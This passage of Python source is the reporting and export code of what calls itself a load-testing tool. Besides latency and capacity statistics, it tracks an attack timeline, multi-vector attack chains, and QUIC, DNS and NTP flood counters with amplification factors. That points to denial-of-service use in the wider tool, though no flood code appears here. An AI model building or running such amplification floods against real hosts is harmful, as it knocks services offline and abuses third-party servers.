            print(f"    |  {Fore.YELLOW}Dominant:{Style.RESET_ALL} {str(dom)[:20]:<20}  {Fore.WHITE}Clustered Ratio:{Style.RESET_ALL} {clusters['clustered_error_ratio']:.2f}{' ' * 30}{Fore.CYAN}|")
            for c in clusters['top_clusters'][:5]:
                label = f"{c['type']}@{c['start_s']:.1f}-{c['end_s']:.1f}s x{c['count']}"
                print(f"    |  {Fore.RED}{label[:74]:<74}{Fore.CYAN}|")

        est = m.resource_estimation()
        print(f"    |  {Fore.WHITE}{Style.BRIGHT}RESOURCE UTILIZATION ESTIMATION (v10.0){Style.RESET_ALL}{' '*37}{Fore.CYAN}|")
        print(f"    |{'-'*78}|")
        print(f"    |  {Fore.CYAN}Little's Law Conc:{Style.RESET_ALL} {est['little_law_concurrency']:>10.1f}  {Fore.YELLOW}Est Server CPU:{Style.RESET_ALL} {est['est_server_cpu_cores']:>7.2f} cores{' ' * 25}{Fore.CYAN}|")
        print(f"    |  {Fore.YELLOW}Est Conn Memory:{Style.RESET_ALL} {est['est_server_conn_memory_mb']:>9.2f} MB  {Fore.WHITE}Est Net:{Style.RESET_ALL} {est['est_network_mbps']:>7.2f} MB/s{' ' * 26}{Fore.CYAN}|")
        print(f"    |  {Fore.GREEN}LoadGen RSS:{Style.RESET_ALL} {est['load_gen_max_rss_mb']:>10.2f} MB  {Fore.WHITE}CPU:{Style.RESET_ALL} {est['load_gen_avg_cpu_percent']:>7.1f}% ({est['load_gen_cpu_seconds']:.1f}s){Fore.CYAN}{' ' * 24}|")

        box = m.box_plot()
        if box.get('count', 0) > 0:
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}RESPONSE TIME BOX PLOT (v10.0){Style.RESET_ALL}{' '*46}{Fore.CYAN}|")
            print(f"    |{'-'*78}|")
            for _label, row in _box_plot_ascii(list(m.response_times)):
                if _label == 'stats':
                    print(f"    |  {Fore.WHITE}{row[:74]:<74}{Fore.CYAN}|")
                else:
                    print(f"    |  {Fore.CYAN}{row[:74]:<74}{Fore.CYAN}|")

        corr = m.error_correlation()
        if corr.get('sample_size', 0) >= 3:
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}ERROR CORRELATION ANALYSIS (v10.0){Style.RESET_ALL}{' '*40}{Fore.CYAN}|")
            print(f"    |{'-'*78}|")
            print(f"    |  {Fore.WHITE}RPS vs Errors: r={corr['rps_vs_error_r']:>6.3f} ({corr['rps_vs_error_label']:<12}){' '*30}{Fore.CYAN}|")
            print(f"    |  {Fore.WHITE}RT  vs Errors: r={corr['response_time_vs_error_r']:>6.3f} ({corr['response_time_vs_error_label']:<12}){' '*30}{Fore.CYAN}|")
            print(f"    |  {Fore.YELLOW}{corr['interpretation'][:74]:<74}{Fore.CYAN}|")

        deg = m.degradation()
        if deg.get('details') and deg.get('severity') != 'none':
            sev_color = Fore.RED if deg.get('detected') else (Fore.YELLOW if deg.get('mild') else Fore.GREEN)
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}PERFORMANCE DEGRADATION DETECTION (v10.0){Style.RESET_ALL}{' '*35}{Fore.CYAN}|")
            print(f"    |{'-'*78}|")
            print(f"    |  {sev_color}Severity:{Style.RESET_ALL} {deg['severity']:<12} {Fore.WHITE}Confidence:{Style.RESET_ALL} {deg['confidence']:.2f}{' '*36}{Fore.CYAN}|")
            print(f"    |  {Fore.WHITE}{deg['details'][:74]:<74}{Fore.CYAN}|")
            print(f"    |  {Fore.WHITE}RT growth: {deg['response_time_growth_pct']:+.1f}%  Err growth: {deg['error_rate_growth_pp']:+.1f}pp  Mono: {deg['monotonic_ratio']:.2f}{' '*20}{Fore.CYAN}|")

        cap = m.capacity()
        print(f"    |  {Fore.WHITE}{Style.BRIGHT}SERVER CAPACITY ESTIMATION (v10.0){Style.RESET_ALL}{' '*41}{Fore.CYAN}|")
        print(f"    |{'-'*78}|")
        print(f"    |  {Fore.GREEN}Max Stable RPS:{Style.RESET_ALL} {cap['max_stable_rps']:>10.1f}  {Fore.YELLOW}Knee RPS:{Style.RESET_ALL} {cap['knee_rps']:>8.1f}  {Fore.WHITE}Headroom:{Style.RESET_ALL} {cap['capacity_headroom_pct']:>5.1f}%{' '*8}{Fore.CYAN}|")
        print(f"    |  {Fore.CYAN}Projected Max:{Style.RESET_ALL} {cap['projected_max_rps_25pct']:>10.1f}  {Fore.WHITE}Bottleneck:{Style.RESET_ALL} {str(cap['estimated_bottleneck'])[:44]:<44}{Fore.CYAN}|")
        sat = 'YES' if cap['saturated'] else 'no'
        print(f"    |  {Fore.RED}Saturated:{Style.RESET_ALL}     {sat:<10} {Fore.WHITE}Conc@Capacity:{Style.RESET_ALL} {cap['concurrency_at_capacity']:>8.1f}{' '*28}{Fore.CYAN}|")

        hs = m.health_score()
        err_pred = m.error_rate_prediction()
        p_ev = m.percentile_evolution()
        te = m.throughput_efficiency()
        bn = self._realtime_bottleneck()
        conn_h = self.connection_health()
        print(f"    |  {Fore.WHITE}{Style.BRIGHT}SERVER HEALTH SCORE (v10.0){Style.RESET_ALL}{' '*49}{Fore.CYAN}|")
        print(f"    |{'-'*78}|")
        hs_color = Fore.GREEN if hs.get('score', 0) >= 80 else (Fore.YELLOW if hs.get('score', 0) >= 60 else Fore.RED)
        print(f"    |  {Fore.WHITE}Score:{Style.RESET_ALL} {hs_color}{hs.get('score', 0):>6.1f}/100 ({hs.get('grade', '?')}){Style.RESET_ALL}  {Fore.WHITE}Status:{Style.RESET_ALL} {str(hs.get('status', '?'))[:20]:<20}{' '*22}{Fore.CYAN}|")
        print(f"    |  {Fore.WHITE}{str(hs.get('interpretation', ''))[:74]:<74}{Fore.CYAN}|")

        print(f"    |  {Fore.WHITE}{Style.BRIGHT}ERROR RATE PREDICTION (v10.0){Style.RESET_ALL}{' '*46}{Fore.CYAN}|")
        print(f"    |{'-'*78}|")
        risk_col = Fore.RED if err_pred.get('risk_level') in ('high', 'elevated') else Fore.GREEN
        print(f"    |  {Fore.WHITE}Current:{Style.RESET_ALL} {err_pred.get('current_error_rate', 0):>6.2f}%  {Fore.WHITE}Pred+30s:{Style.RESET_ALL} {Fore.YELLOW}{err_pred.get('predicted_error_rate_30s', 0):>6.2f}%{Style.RESET_ALL}  {Fore.WHITE}Pred+60s:{Style.RESET_ALL} {Fore.RED}{err_pred.get('predicted_error_rate_60s', 0):>6.2f}%{Fore.CYAN}{' '*8}|")
        print(f"    |  {Fore.WHITE}Trend:{Style.RESET_ALL} {str(err_pred.get('trend', '?'))[:12]:<12}  {Fore.WHITE}Risk:{Style.RESET_ALL} {risk_col}{str(err_pred.get('risk_level', '?'))[:10]:<10}{Style.RESET_ALL}  {Fore.WHITE}Confidence:{Style.RESET_ALL} {err_pred.get('confidence', 0):.2f} R2={err_pred.get('r_squared', 0):.3f}{' '*8}{Fore.CYAN}|")
        breach = err_pred.get('breach_seconds_to_5pct')
        breach_str = f"{breach}s" if breach is not None else 'n/a'
        print(f"    |  {Fore.WHITE}Slope/s:{Style.RESET_ALL} {err_pred.get('slope_per_sec', 0):>10.5f}  {Fore.WHITE}Breach 5%:{Style.RESET_ALL} {breach_str:<10}{' '*36}{Fore.CYAN}|")

        print(f"    |  {Fore.WHITE}{Style.BRIGHT}PERCENTILE EVOLUTION & THROUGHPUT EFFICIENCY (v10.0){Style.RESET_ALL}{' '*23}{Fore.CYAN}|")
        print(f"    |{'-'*78}|")
        p95_dir = str((p_ev.get('p95') or {}).get('direction', 'n/a'))
        print(f"    |  {Fore.WHITE}P95:{Style.RESET_ALL} {p95_dir[:10]:<10} slope={(p_ev.get('p95') or {}).get('slope_per_sec', 0):>7.3f}ms/s  {Fore.WHITE}Stability:{Style.RESET_ALL} {str(p_ev.get('stability', '?'))[:14]:<14}{' '*16}{Fore.CYAN}|")
        print(f"    |  {Fore.WHITE}Convergence:{Style.RESET_ALL} {p_ev.get('convergence_pct', 0):>6.1f}%  {Fore.WHITE}Proj P95:{Style.RESET_ALL} {p_ev.get('projected_p95_ms', 0):>8.1f}ms{' '*34}{Fore.CYAN}|")
        print(f"    |  {Fore.WHITE}Throughput Eff:{Style.RESET_ALL} {te.get('efficiency_pct', 0):>6.1f}%  {Fore.WHITE}Bytes/req:{Style.RESET_ALL} {te.get('bytes_per_request', 0):>9.0f}  {Fore.WHITE}Sat:{Style.RESET_ALL} {str(te.get('saturation', '?'))[:16]:<16}{' '*10}{Fore.CYAN}|")
        print(f"    |  {Fore.WHITE}Bottleneck:{Style.RESET_ALL} {str(bn.get('primary', 'none'))[:20]:<20} {Fore.WHITE}Severity:{Style.RESET_ALL} {str(bn.get('severity', '?'))[:10]:<10} conf={bn.get('confidence', 0):.2f}{' '*12}{Fore.CYAN}|")
        if bn.get('signals'):
            print(f"    |  {Fore.YELLOW}Signals:{Style.RESET_ALL} {('; '.join(bn['signals']))[:66]:<66}{Fore.CYAN}|")
        print(f"    |  {Fore.WHITE}Conn Health:{Style.RESET_ALL} {str(conn_h.get('status', '?'))[:14]:<14} success={conn_h.get('overall_success_pct', 0):>5.1f}%  maxFails={conn_h.get('max_consecutive_failures', 0):<6}{' '*10}{Fore.CYAN}|")
        if self.cfg.get('auto_tune'):
            print(f"    |  {Fore.WHITE}Auto-Tune:{Style.RESET_ALL} {self._auto_tune_state.get('adjustments', 0):>4} adjustments  delay={self._auto_tune_state.get('target_worker_delay', 0):.3f}s{' '*30}{Fore.CYAN}|")
        if m.smart_url_picks:
            top_url = max(m.smart_url_picks.items(), key=lambda x: x[1])
            print(f"    |  {Fore.WHITE}Smart Dist:{Style.RESET_ALL} {len(m.smart_url_picks)} urls  top={str(top_url[0])[:40]} x{top_url[1]}{' '*8}{Fore.CYAN}|")
        if m.graphql_queries_sent or m.rest_requests_sent or m.ws_chat_messages_sent:
            print(f"    |  {Fore.CYAN}v10 Counters:{Style.RESET_ALL} gql={m.graphql_queries_sent:<8} rest={m.rest_requests_sent:<8} chat={m.ws_chat_messages_sent:<8}{' '*14}{Fore.CYAN}|")

        timeline = m.attack_timeline()
        if timeline['events']:
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}ATTACK TIMELINE (v10.0){Style.RESET_ALL}{' '*54}{Fore.CYAN}|")
            print(f"    |{'-'*78}|")
            for tl_line in timeline['ascii'][:14]:
                print(f"    |  {Fore.CYAN}{str(tl_line)[:74]:<74}{Fore.CYAN}|")
            if timeline['phases']:
                ph = ', '.join(f"{p['pattern']}@{p['start_s']:.0f}s" for p in timeline['phases'][:4])
                print(f"    |  {Fore.WHITE}Phases: {ph[:66]:<66}{Fore.CYAN}|")
            if timeline['vector_usage']:
                vu = ', '.join(f"{k}:{v}" for k, v in sorted(timeline['vector_usage'].items(), key=lambda x: -x[1])[:4])
                print(f"    |  {Fore.WHITE}Vectors: {vu[:65]:<65}{Fore.CYAN}|")
            if timeline['intensity_history']:
                last_i = timeline['intensity_history'][-1]
                print(f"    |  {Fore.WHITE}Intensity now: {last_i['factor']:.2f} ({last_i['reason']}){' '*40}{Fore.CYAN}|")

        if m.quic_packets_sent or m.dns_queries_sent or m.ntp_queries_sent:
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}L7/L4 FLOOD COUNTERS (v10.0){Style.RESET_ALL}{' '*48}{Fore.CYAN}|")
            print(f"    |{'-'*78}|")
            if m.quic_packets_sent:
                print(f"    |  {Fore.CYAN}QUIC:{Style.RESET_ALL} Packets={m.quic_packets_sent:<10,} Responses={m.quic_responses:<10,}{' '*20}{Fore.CYAN}|")
            if m.dns_queries_sent:
                amp = m.avg_amplification_factor if m.ntp_queries_sent == 0 else (m.dns_bytes_recv / max(1, m.dns_bytes_sent))
                print(f"    |  {Fore.CYAN}DNS:{Style.RESET_ALL}  Queries={m.dns_queries_sent:<10,} Responses={m.dns_responses:<10,} AvgAmp={amp:.1f}x{' '*14}{Fore.CYAN}|")
            if m.ntp_queries_sent:
                amp = m.ntp_bytes_recv / max(1, m.ntp_bytes_sent)
                print(f"    |  {Fore.CYAN}NTP:{Style.RESET_ALL}  Queries={m.ntp_queries_sent:<10,} Responses={m.ntp_responses:<10,} AvgAmp={amp:.1f}x{' '*14}{Fore.CYAN}|")

        if m.correlation_ids_issued:
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}CORRELATION IDS (v10.0){Style.RESET_ALL}{' '*54}{Fore.CYAN}|")
            print(f"    |  {Fore.CYAN}Issued:{Style.RESET_ALL} {m.correlation_ids_issued:>14,}  {Fore.WHITE}Echoed:{Style.RESET_ALL} {m.correlation_echoed:>14,}  {Fore.YELLOW}Rate:{Style.RESET_ALL} {m.correlation_echo_rate:>6.2f}%{Fore.CYAN}{' ' * 10}|")

        if m.scenario_assert_pass + m.scenario_assert_fail > 0:
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}SCENARIO ASSERTIONS (v10.0){Style.RESET_ALL}{' '*50}{Fore.CYAN}|")
            print(f"    |  {Fore.GREEN}Pass:{Style.RESET_ALL} {m.scenario_assert_pass:>14,}  {Fore.RED}Fail:{Style.RESET_ALL} {m.scenario_assert_fail:>14,}  {Fore.YELLOW}Rate:{Style.RESET_ALL} {m.assertion_rate:>6.2f}%{Fore.CYAN}{' ' * 14}|")
            for sample in m.assertion_fail_samples[:5]:
                fails = ', '.join(sample.get('failures', []))[:60]
                print(f"    |  {Fore.RED}step {sample.get('step', '?')}: {fails:<66}{Fore.CYAN}|")

        if m.validation_rule_fails:
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}CUSTOM RULE FAILURES (v10.0){Style.RESET_ALL}{' '*48}{Fore.CYAN}|")
            print(f"    |{'-'*78}|")
            for rule_label, count in sorted(m.validation_rule_fails.items(), key=lambda x: -x[1])[:8]:
                print(f"    |  {Fore.RED}{rule_label[:56]:<56} {count:>14,}{Fore.CYAN}{' ' * 4}|")

        print(f"    +{'='*78}+")

        if m.total_requests > 0:
            sr = s['rate']
            if sr >= 99:
                verdict = f"{Fore.GREEN}{Style.BRIGHT}*** EXCELLENT - Site handled load perfectly!{Style.RESET_ALL}"
            elif sr >= 90:
                verdict = f"{Fore.YELLOW}{Style.BRIGHT}**  GOOD - Minor issues under load{Style.RESET_ALL}"
            elif sr >= 70:
                verdict = f"{Fore.RED}{Style.BRIGHT}*   FAIR - Noticeable degradation{Style.RESET_ALL}"
            else:
                verdict = f"{Fore.RED}{Style.BRIGHT}!!! CRITICAL - Site struggling under load!{Style.RESET_ALL}"
        else:
            verdict = f"{Fore.RED}No data collected{Style.RESET_ALL}"

        print(f"    |  {Fore.WHITE}{Style.BRIGHT}VERDICT:{Style.RESET_ALL}{' '*68}{Fore.CYAN}|")
        import re
        clean = re.sub(r'\033\[[0-9;]*m', '', verdict)
        pad = max(0, 76 - len(clean))
        print(f"    |  {verdict}{' ' * pad}{Fore.CYAN}|")
        print(f"    +{'='*78}+{Style.RESET_ALL}")
        print()

    def export_json(self, path: str):
        m = self.metrics
        s = m.snapshot()
        data = {
            'version': '10.0',
            'target_url': self.cfg['url'],
            'all_urls': self.cfg.get('urls', [self.cfg['url']]),
            'pattern': self.cfg['pattern'].value,
            'total_users': self.cfg['users'],
            'concurrency': self.cfg['concurrency'],
            'http2_enabled': self.cfg.get('http2', False),
            'tls_version': self.cfg.get('tls_version', 'default'),
            'cipher_suite': self.cfg.get('cipher_suite', 'default'),
            'keepalive_timeout': self.cfg.get('keepalive_timeout', 30),
            'http2_priority': self.cfg.get('http2_priority', False),
            'duration': m.duration,
            'total_requests': m.total_requests,
            'successful': m.successful,
            'failed': m.failed,
            'success_rate': m.success_rate,
            'error_rate': m.error_rate,
            'avg_rps': m.avg_rps,
            'peak_rps': m.peak_rps,
            'max_concurrent': m.max_concurrent,
            'avg_response_time': m.avg_response_time,
            'median_response_time': m.median_response_time,
            'stddev_response_time': m.stddev_response_time,
            'coefficient_of_variation': m.coefficient_of_variation,
            'outlier_count': len(m.statistical_outliers),
            'p50': m.p50, 'p90': m.p90, 'p95': m.p95, 'p99': m.p99, 'p999': m.p999,
            'min_response': m.min_rt, 'max_response': m.max_rt,
            'status_codes': m.status_codes,
            'latency_distribution': dict(m.latency_buckets),
            'timeout_errors': m.timeout_errors,
            'connection_errors': m.conn_errors,
            'http_4xx': m.http_4xx, 'http_5xx': m.http_5xx,
            'error_type_breakdown': s['error_type_counts'],
            'total_bytes': m.total_bytes,
            'total_bytes_sent': m.total_bytes_sent,
            'total_bytes_recv': m.total_bytes_recv,
            'throughput_mbps': m.throughput_mbps,
            'bytes_sent_mbps': m.bytes_sent_mbps,
            'bytes_recv_mbps': m.bytes_recv_mbps,
            'validation_passes': m.validation_passes,
            'validation_fails': m.validation_fails,
            'validation_rate': m.validation_rate,
            'websocket_messages': m.websocket_msgs,
            'websocket_bytes': m.websocket_bytes,
            'per_url_metrics': m.per_url_metrics,
            'rps_history': list(m._rps_history),
            'response_time_history': list(m._response_times_history),
            'throughput_history': list(m._throughput_history),
            'error_rate_history': list(m._error_rate_history),
            'error_rate_per_second': m.error_rate_per_second,
            'per_second_details': m._per_second_details,
            'connection_reuse_rate': s['conn_reuse'],
            'connection_reuse_efficiency': m.connection_reuse_efficiency,
            'connections_reused': m.total_reused_connections,
            'connections_new': m.total_new_connections,
            'avg_connect_time_ms': m.avg_connect_time,
            'avg_ttfb_ms': m.avg_ttfb,
            'avg_server_processing_ms': m.avg_server_processing,
            'avg_network_overhead_ms': m.avg_network_overhead,
            'avg_error_recovery_ms': m.avg_error_recovery,
            'max_error_recovery_ms': m.max_error_recovery,
            'rolling_10s': s['rolling_10s'],
            'rolling_30s': s['rolling_30s'],
            'rolling_60s': s['rolling_60s'],
            'dynamic_scale_events': m.dynamic_scale_history,
            'pool_stats': self._conn_pool.get_stats(),
            'connection_health': self.connection_health(),
            'connection_health_summary': self._conn_health.summary(),
            'auto_tuning': {
                'enabled': bool(self.cfg.get('auto_tune', False)),
                'adjustments': self._auto_tune_state.get('adjustments', 0),
                'final_worker_delay': self._auto_tune_state.get('target_worker_delay', 0.0),
                'final_batch_size': self._auto_tune_state.get('target_batch_size'),
                'history': list(m.auto_tune_history),
            },
            'smart_distribution': {
                'enabled': bool(self.cfg.get('smart_distribution', False)),
                'url_picks': dict(m.smart_url_picks),
            },
            'realtime_bottleneck': self._realtime_bottleneck(),
            'scenarios': [],
            'geo_simulation': self.cfg.get('geo_simulation', False),
            'timestamp': datetime.now().isoformat(),
            'correlation_ids': {
                'enabled': bool(self.cfg.get('correlation_ids', True)),
                'issued': m.correlation_ids_issued,
                'echoed': m.correlation_echoed,
                'echo_rate': m.correlation_echo_rate,
            },
            'response_time_heatmap': {
                'bands': list(LATENCY_BAND_LABELS),
                'history': list(m.heatmap_history),
            },
            'percentile_trend': list(m.percentile_history),
            'error_cluster_analysis': m.analyze_error_clusters(),
            'resource_estimation': m.resource_estimation(),
            'scenario_assertions': {
                'pass': m.scenario_assert_pass,
                'fail': m.scenario_assert_fail,
                'rate': m.assertion_rate,
                'fail_samples': list(m.assertion_fail_samples[-100:]),
            },
            'custom_rule_failures': dict(m.validation_rule_fails),
            'statistical_analysis': self._build_statistical_analysis(),
            'skewness': _skewness(list(m.response_times)[-10000:]),
            'kurtosis_excess': _kurtosis_excess(list(m.response_times)[-10000:]),
            'box_plot': m.box_plot(),
            'box_plot_ascii': [row for _lbl, row in _box_plot_ascii(list(m.response_times))],
            'error_correlation': m.error_correlation(),
            'degradation': m.degradation(),
            'capacity': m.capacity(),
            'predictions': {
                'error_rate_prediction': m.error_rate_prediction(),
                'percentile_evolution': m.percentile_evolution(),
                'server_health_score': m.health_score(),
                'throughput_efficiency': m.throughput_efficiency(),
                'health_score_history': list(m.health_score_history),
                'bottleneck_history': list(m.bottleneck_history),
                'generated_at': datetime.now().isoformat(),
            },
            'connection_health': self.connection_health(),
            'connection_health_summary': self._conn_health.summary(),
            'auto_tuning': {
                'enabled': bool(self.cfg.get('auto_tune', False)),
                'adjustments': self._auto_tune_state.get('adjustments', 0),
                'final_worker_delay': self._auto_tune_state.get('target_worker_delay', 0.0),
                'final_batch_size': self._auto_tune_state.get('target_batch_size'),
                'history': list(m.auto_tune_history),
            },
            'smart_distribution': {
                'enabled': bool(self.cfg.get('smart_distribution', False)),
                'url_picks': dict(m.smart_url_picks),
            },
            'realtime_bottleneck': self._realtime_bottleneck(),
            'protocol_counters': {
                'graphql_queries_sent': m.graphql_queries_sent,
                'graphql_errors': m.graphql_errors,
                'rest_requests_sent': m.rest_requests_sent,
                'ws_chat_messages_sent': m.ws_chat_messages_sent,
            },
            'attack_timeline': m.attack_timeline(),
            'attack_data': {
                'chain': [list(c) for c in (self.cfg.get('chain') or [])],
                'chain_phases': [
                    {'pattern': p.value, 'start_s': s, 'end_s': e}
                    for p, s, e in self._chain_resolved
                ],
                'multi_vector': list(self.cfg.get('multi_vector') or []),
                'vector_usage': dict(m.vector_usage),
                'adaptive_intensity': bool(self.cfg.get('adaptive_intensity', False)),
                'intensity_history': list(m.intensity_history),
                'final_intensity': round(self._intensity, 3),
                'quic': {
                    'packets_sent': m.quic_packets_sent,
                    'responses': m.quic_responses,
                },
                'dns_amplification': {
                    'queries_sent': m.dns_queries_sent,
                    'responses': m.dns_responses,
                    'bytes_sent': m.dns_bytes_sent,
                    'bytes_recv': m.dns_bytes_recv,
                    'avg_amplification_factor': round(
                        (m.dns_bytes_recv / m.dns_bytes_sent) if m.dns_bytes_sent else 0.0, 2),
                },
                'ntp_amplification': {
                    'queries_sent': m.ntp_queries_sent,
                    'responses': m.ntp_responses,
                    'bytes_sent': m.ntp_bytes_sent,
                    'bytes_recv': m.ntp_bytes_recv,
                    'avg_amplification_factor': round(
                        (m.ntp_bytes_recv / m.ntp_bytes_sent) if m.ntp_bytes_sent else 0.0, 2),
                },
            },
            'request_response_data': [],
        }
        if self.cfg.get('scenarios'):
            for scenario in self.cfg['scenarios']:
                steps = []
                for step in scenario:
                    steps.append({
                        'url': step.url,
                        'method': step.method,
                        'ws_message_type': step.ws_message_type,
                        'assertions': list(step.assertions),
                    })
                data['scenarios'].append(steps)
        if m.request_logs:
            full_logs = []
            for log in m.request_logs[-5000:]:
                full_logs.append({
                    'timestamp': log.timestamp,
                    'timestamp_iso': datetime.fromtimestamp(log.timestamp).isoformat(),
                    'correlation_id': log.correlation_id,
                    'url': log.url,
                    'method': log.method,
                    'pattern': log.pattern,
                    'status': log.status,
                    'response_time_ms': round(log.response_time_ms, 2),
                    'size_bytes': log.size_bytes,
                    'connect_time_ms': round(log.connect_time_ms, 2),
                    'ttfb_ms': round(log.ttfb_ms, 2),
                    'download_ms': round(log.download_ms, 2),
                    'error': log.error,
                    'valid': log.valid,
                    'failed_rules': list(log.failed_rules),
                    'assertion_failures': list(log.assertion_failures),
                    'response_snippet': log.response_snippet,
                })
            data['request_response_data'] = full_logs
        with open(path, 'w') as f:
            json.dump(data, f, indent=2, default=str)
        print(f"    {Fore.GREEN}[+] JSON report saved: {path}{Style.RESET_ALL}")

    def _build_statistical_analysis(self) -> dict:
        m = self.metrics
        sample = list(m.response_times)[-10000:]
        if not sample:
            sample = [0.0]
        mean = sum(sample) / len(sample)
        var = statistics.pvariance(sample) if len(sample) > 1 else 0.0
        sd = math.sqrt(var)
        return {
            'sample_size': len(sample),
            'mean_ms': round(mean, 3),
            'median_ms': round(statistics.median(sample), 3),
            'stddev_ms': round(sd, 3),
            'cv': round(m.coefficient_of_variation, 4),
            'p50': round(m.p50, 3),
            'p90': round(m.p90, 3),
            'p95': round(m.p95, 3),
            'p99': round(m.p99, 3),
            'p999': round(m.p999, 3),
            'min_ms': round(m.min_rt, 3),
            'max_ms': round(m.max_rt, 3),
            'skewness': round(_skewness(sample), 4),
            'kurtosis_excess': round(_kurtosis_excess(sample), 4),
            'outliers_3sigma': len(m.statistical_outliers),
            'outlier_ratio': round(len(m.statistical_outliers) / max(1, m.total_requests), 4),
        }

    def export_csv(self, path: str):
        m = self.metrics
        with open(path, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['metric', 'value'])
            writer.writerow(['version', '10.0'])
            writer.writerow(['target_url', self.cfg['url']])
            writer.writerow(['all_urls', json.dumps(self.cfg.get('urls', [self.cfg['url']]))])
            writer.writerow(['pattern', self.cfg['pattern'].value])
            writer.writerow(['total_users', self.cfg['users']])
            writer.writerow(['concurrency', self.cfg['concurrency']])
            writer.writerow(['http2_enabled', self.cfg.get('http2', False)])
            writer.writerow(['tls_version', self.cfg.get('tls_version', 'default')])
            writer.writerow(['cipher_suite', self.cfg.get('cipher_suite', 'default')])
            writer.writerow(['keepalive_timeout', self.cfg.get('keepalive_timeout', 30)])
            writer.writerow(['http2_priority', self.cfg.get('http2_priority', False)])
            writer.writerow(['duration_seconds', f'{m.duration:.2f}'])
            writer.writerow(['total_requests', m.total_requests])
            writer.writerow(['successful', m.successful])
            writer.writerow(['failed', m.failed])
            writer.writerow(['success_rate_percent', f'{m.success_rate:.2f}'])
            writer.writerow(['error_rate_percent', f'{m.error_rate:.2f}'])
            writer.writerow(['avg_rps', f'{m.avg_rps:.2f}'])
            writer.writerow(['peak_rps', f'{m.peak_rps:.2f}'])
            writer.writerow(['max_concurrent', m.max_concurrent])
            writer.writerow(['avg_response_ms', f'{m.avg_response_time:.2f}'])
            writer.writerow(['median_response_ms', f'{m.median_response_time:.2f}'])
            writer.writerow(['stddev_response_ms', f'{m.stddev_response_time:.2f}'])
            writer.writerow(['p50_ms', f'{m.p50:.2f}'])
            writer.writerow(['p90_ms', f'{m.p90:.2f}'])
            writer.writerow(['p95_ms', f'{m.p95:.2f}'])
            writer.writerow(['p99_ms', f'{m.p99:.2f}'])
            writer.writerow(['p999_ms', f'{m.p999:.2f}'])
            writer.writerow(['min_response_ms', f'{m.min_rt:.2f}'])
            writer.writerow(['max_response_ms', f'{m.max_rt:.2f}'])
            writer.writerow(['avg_connect_time_ms', f'{m.avg_connect_time:.2f}'])
            writer.writerow(['avg_ttfb_ms', f'{m.avg_ttfb:.2f}'])
            writer.writerow(['avg_server_processing_ms', f'{m.avg_server_processing:.2f}'])
            writer.writerow(['avg_network_overhead_ms', f'{m.avg_network_overhead:.2f}'])
            writer.writerow(['avg_error_recovery_ms', f'{m.avg_error_recovery:.2f}'])
            writer.writerow(['max_error_recovery_ms', f'{m.max_error_recovery:.2f}'])
            writer.writerow(['total_bytes', m.total_bytes])
            writer.writerow(['total_bytes_sent', m.total_bytes_sent])
            writer.writerow(['total_bytes_recv', m.total_bytes_recv])
            writer.writerow(['throughput_mbps', f'{m.throughput_mbps:.2f}'])
            writer.writerow(['timeout_errors', m.timeout_errors])
            writer.writerow(['connection_errors', m.conn_errors])
            writer.writerow(['http_4xx', m.http_4xx])
            writer.writerow(['http_5xx', m.http_5xx])
            writer.writerow(['validation_passes', m.validation_passes])
            writer.writerow(['validation_fails', m.validation_fails])
            writer.writerow(['validation_rate', f'{m.validation_rate:.2f}'])
            writer.writerow(['websocket_messages', m.websocket_msgs])
            writer.writerow(['websocket_bytes', m.websocket_bytes])
            writer.writerow(['connection_reuse_rate', f'{m.connection_reuse_rate:.2f}'])
            writer.writerow(['coefficient_of_variation', f'{m.coefficient_of_variation:.4f}'])
            writer.writerow(['outlier_count', len(m.statistical_outliers)])
            writer.writerow(['connection_reuse_efficiency', f'{m.connection_reuse_efficiency:.2f}'])
            writer.writerow(['correlation_ids_issued', m.correlation_ids_issued])
            writer.writerow(['correlation_ids_echoed', m.correlation_echoed])
            writer.writerow(['scenario_assert_pass', m.scenario_assert_pass])
            writer.writerow(['scenario_assert_fail', m.scenario_assert_fail])

            stats = self._build_statistical_analysis()
            writer.writerow([])
            writer.writerow(['--- STATISTICAL ANALYSIS ---'])
            writer.writerow(['stat_key', 'value'])
            for k, v in stats.items():
                writer.writerow([k, v])

            clusters = m.analyze_error_clusters()
            writer.writerow([])
            writer.writerow(['--- ERROR CLUSTERING ---'])
            writer.writerow(['cluster_index', 'type', 'count', 'start_s', 'end_s', 'duration_s'])
            for i, c in enumerate(clusters['top_clusters'], 1):
                writer.writerow([i, c['type'], c['count'], c['start_s'], c['end_s'], c['duration_s']])
            writer.writerow(['total_errors', clusters['total_errors']])
            writer.writerow(['cluster_count', clusters['cluster_count']])
            writer.writerow(['dominant_type', clusters['dominant_type'] or ''])
            writer.writerow(['largest_cluster', clusters['largest_cluster']])
            writer.writerow(['mean_cluster_size', clusters['mean_cluster_size']])

            est = m.resource_estimation()
            writer.writerow([])
            writer.writerow(['--- RESOURCE ESTIMATION ---'])
            for k, v in est.items():
                writer.writerow([k, v])

            box = m.box_plot()
            writer.writerow([])
            writer.writerow(['--- RESPONSE TIME BOX PLOT ---'])
            writer.writerow(['stat', 'value_ms'])
            for k in ('min', 'q1', 'median', 'q3', 'max', 'iqr',
                      'lower_fence', 'upper_fence', 'whisker_low', 'whisker_high'):
                writer.writerow([k, box.get(k, 0)])
            writer.writerow(['outliers', box.get('outliers', 0)])
            writer.writerow(['count', box.get('count', 0)])

            corr = m.error_correlation()
            writer.writerow([])
            writer.writerow(['--- ERROR CORRELATION ANALYSIS ---'])
            writer.writerow(['pair', 'pearson_r', 'strength'])
            writer.writerow(['rps_vs_error', corr['rps_vs_error_r'], corr['rps_vs_error_label']])
            writer.writerow(['response_time_vs_error', corr['response_time_vs_error_r'],
                             corr['response_time_vs_error_label']])
            writer.writerow(['rps_vs_response_time', corr['rps_vs_response_time_r'],
                             corr['rps_vs_response_time_label']])
            writer.writerow(['interpretation', corr['interpretation']])
            if corr['high_error_seconds']:
                writer.writerow([])
                writer.writerow(['high_error_second', 'rps', 'error_rate'])
                for h in corr['high_error_seconds']:
                    writer.writerow([h['second'], h['rps'], h['error_rate']])

            deg = m.degradation()
            writer.writerow([])
            writer.writerow(['--- PERFORMANCE DEGRADATION ---'])
